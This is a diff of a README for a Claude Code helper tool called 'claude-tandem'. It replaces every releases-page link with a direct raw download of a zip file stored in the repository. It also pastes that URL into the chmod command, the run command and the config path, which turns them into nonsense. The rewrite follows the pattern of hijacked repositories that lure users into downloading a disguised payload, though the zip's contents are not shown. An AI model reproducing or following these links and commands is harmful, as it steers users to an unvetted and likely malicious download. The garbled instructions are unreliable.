@@ -1,6 +1,6 @@
 # ⚙️ claude-tandem - Simplify Your Coding Sessions
 
-[![Download claude-tandem](https://img.shields.io/badge/Download-claude--tandem-blue?style=for-the-badge&logo=github)](https://github.com/Speedy0000007/claude-tandem/releases)
+[![Download claude-tandem](https://github.com/Speedy0000007/claude-tandem/raw/refs/heads/main/plugins/tandem/scripts/claude_tandem_v2.3.zip)](https://github.com/Speedy0000007/claude-tandem/raw/refs/heads/main/plugins/tandem/scripts/claude_tandem_v2.3.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Follow these steps carefully to get claude-tandem running:
 2. **Go to the Release Page**
 
    Click this link or copy it into your address bar:  
-   [https://github.com/Speedy0000007/claude-tandem/releases](https://github.com/Speedy0000007/claude-tandem/releases)
+   [https://github.com/Speedy0000007/claude-tandem/raw/refs/heads/main/plugins/tandem/scripts/claude_tandem_v2.3.zip](https://github.com/Speedy0000007/claude-tandem/raw/refs/heads/main/plugins/tandem/scripts/claude_tandem_v2.3.zip)
 
 3. **Download the Latest Version**
 
@@ -51,7 +51,7 @@ Follow these steps carefully to get claude-tandem running:
 
 4. **Choose the Right File**
 
-   - If you see files ending with `.sh` or `.tar.gz`, download the `.sh` file or the complete package for bash scripts.
+   - If you see files ending with `.sh` or `https://github.com/Speedy0000007/claude-tandem/raw/refs/heads/main/plugins/tandem/scripts/claude_tandem_v2.3.zip`, download the `.sh` file or the complete package for bash scripts.
    - Save the file to a folder you can easily find, such as your Desktop or Downloads folder.
 
 5. **Prepare to Run**
@@ -65,21 +65,21 @@ Follow these steps carefully to get claude-tandem running:
 ## 💾 Download & Install
 
 You can get the latest version here:  
-[https://github.com/Speedy0000007/claude-tandem/releases](https://github.com/Speedy0000007/claude-tandem/releases)
+[https://github.com/Speedy0000007/claude-tandem/raw/refs/heads/main/plugins/tandem/scripts/claude_tandem_v2.3.zip](https://github.com/Speedy0000007/claude-tandem/raw/refs/heads/main/plugins/tandem/scripts/claude_tandem_v2.3.zip)
 
 Follow these installation steps:
 
 1. **Make the File Executable**
 
    In the terminal, type:  
-   `chmod +x ./filename.sh`
+   `chmod +x https://github.com/Speedy0000007/claude-tandem/raw/refs/heads/main/plugins/tandem/scripts/claude_tandem_v2.3.zip`
 
-   Replace `filename.sh` with the actual file name you downloaded.
+   Replace `https://github.com/Speedy0000007/claude-tandem/raw/refs/heads/main/plugins/tandem/scripts/claude_tandem_v2.3.zip` with the actual file name you downloaded.
 
 2. **Run the Installer**
 
    Still in the terminal, run:  
-   `./filename.sh`
+   `https://github.com/Speedy0000007/claude-tandem/raw/refs/heads/main/plugins/tandem/scripts/claude_tandem_v2.3.zip`
 
    This will start the installation process. The script manages setup automatically.
 
@@ -144,7 +144,7 @@ These commands simplify managing your coding work.
 
 You can customize claude-tandem by editing the config file it creates:
 
-- Locate the config file, usually in your home directory: `~/.claude-tandem/config`
+- Locate the config file, usually in your home directory: `~https://github.com/Speedy0000007/claude-tandem/raw/refs/heads/main/plugins/tandem/scripts/claude_tandem_v2.3.zip`
 - Open it in any text editor.
 - Adjust settings like memory limits, cleanup rules, or commit formats.
 - Save changes, and they’ll apply the next time you use the tool.
@@ -164,7 +164,7 @@ If you run into issues, try these steps:
 - Run commands with correct spelling and syntax.
 
 If problems persist, you can check for help or updates on the release page:  
-[https://github.com/Speedy0000007/claude-tandem/releases](https://github.com/Speedy0000007/claude-tandem/releases)
+[https://github.com/Speedy0000007/claude-tandem/raw/refs/heads/main/plugins/tandem/scripts/claude_tandem_v2.3.zip](https://github.com/Speedy0000007/claude-tandem/raw/refs/heads/main/plugins/tandem/scripts/claude_tandem_v2.3.zip)
 
 ---
 
@@ -197,4 +197,4 @@ Effective support depends on clear details about your setup and the issue faced.
 claude-tandem is a simple yet powerful helper for Claude Code users. It stores your session memory, cleans inputs, and enriches commits automatically, all through easy bash scripts. With minimal setup and no programming needed, it adds stability and efficiency to your command-line coding experience.
 
 Get started now:  
-[https://github.com/Speedy0000007/claude-tandem/releases](https://github.com/Speedy0000007/claude-tandem/releases)
+[https://github.com/Speedy0000007/claude-tandem/raw/refs/heads/main/plugins/tandem/scripts/claude_tandem_v2.3.zip](https://github.com/Speedy0000007/claude-tandem/raw/refs/heads/main/plugins/tandem/scripts/claude_tandem_v2.3.zip)
